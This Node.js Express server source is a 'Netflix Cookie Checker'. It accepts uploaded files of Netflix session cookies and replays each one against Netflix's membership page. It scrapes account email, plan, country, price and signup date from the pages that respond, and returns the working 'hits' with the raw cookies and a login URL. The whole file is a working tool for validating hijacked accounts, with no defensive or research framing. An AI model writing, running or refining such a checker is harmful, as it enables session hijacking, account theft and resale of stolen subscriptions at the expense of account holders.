import express from 'express';
import cors from 'cors';
import multer from 'multer';
import axios from 'axios';
import cheerio from 'cheerio';
import { fileURLToPath } from 'url';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
  origin: '*',           // Change to your frontend URL in production for security
  credentials: true
}));
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

// Simple Netflix cookie checker
async function checkNetflixCookie(cookieText, filename) {
  try {
    const cookies = cookieText.trim();
    if (!cookies) return null;

    const session = axios.create({
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Cookie': cookies
      },
      maxRedirects: 5,
      timeout: 15000
    });

    const response = await session.get('https://www.netflix.com/account/membership');

    // If redirected to login page → dead cookie
    if (response.request.res.responseUrl && response.request.res.responseUrl.includes('login')) {
      return null;
    }

    const html = response.data;
    const $ = cheerio.load(html);

    // Extract basic info
    const email = $('[data-uia="account-email"]').text().trim() || 
                  html.match(/"emailAddress":"([^"]+)"/)?.[1];

    const plan = html.match(/"localizedPlanName":\s*{"[^"]+":"([^"]+)"/)?.[1] || 
                 'Unknown Plan';

    const countryMatch = html.match(/"countryOfSignup":"([^"]+)"/);
    const countryCode = countryMatch ? countryMatch[1] : 'XX';

    const isPremium = html.includes('membershipStatus":"CURRENT_MEMBER') || 
                      html.includes('Premium');

    if (!isPremium && !email) return null;

    return {
      success: true,
      email: email || 'Unknown',
      plan: plan,
      country_code: countryCode,
      country: countryCode === 'US' ? 'United States' : countryCode,
      price: html.match(/"currentMemberPlanPriceAmount":\s*{"[^"]+":"([^"]+)"/)?.[1] || 'N/A',
      member_since: html.match(/"memberSinceDate":\s*{"[^"]+":"([^"]+)"/)?.[1] || 'N/A',
      cookie: cookies,
      source: filename,
      login_url: `https://www.netflix.com/account`
    };

  } catch (error) {
    console.error(`Error checking ${filename}:`, error.message);
    return null;
  }
}

// API Endpoint
app.post('/api/check-cookies', upload.array('cookies'), async (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({ error: 'No files uploaded' });
  }

  const results = [];
  const hits = [];

  for (const file of req.files) {
    const cookieText = file.buffer.toString('utf-8');
    const result = await checkNetflixCookie(cookieText, file.originalname);

    results.push({
      filename: file.originalname,
      status: result ? 'hit' : 'bad'
    });

    if (result) {
      hits.push(result);
    }
  }

  res.json({
    total: req.files.length,
    hits: hits.length,
    results: results,
    premium_hits: hits
  });
});

app.get('/', (req, res) => {
  res.send('Netflix Cookie Checker Backend is running!');
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
